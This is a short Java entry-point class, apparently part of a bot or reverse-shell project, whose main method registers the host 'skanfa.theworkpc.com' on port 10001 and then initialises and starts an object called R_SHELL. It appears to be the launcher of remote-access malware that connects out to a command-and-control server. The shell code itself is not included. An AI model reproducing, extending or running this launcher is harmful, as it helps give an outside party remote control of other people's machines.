package com.github.kvac.shells.shells.bot.init;

import com.github.kvac.shells.shells.bot.header.SHELLHEADER;

/**
 *
 * @author jdcs_dev
 */
public class Init {

    public static void main(String[] args) {
        SHELLHEADER.getCAC().put("skanfa.theworkpc.com", 10001);
        SHELLHEADER.getR_SHELL().init();
        SHELLHEADER.getR_SHELL().start();
    }

}
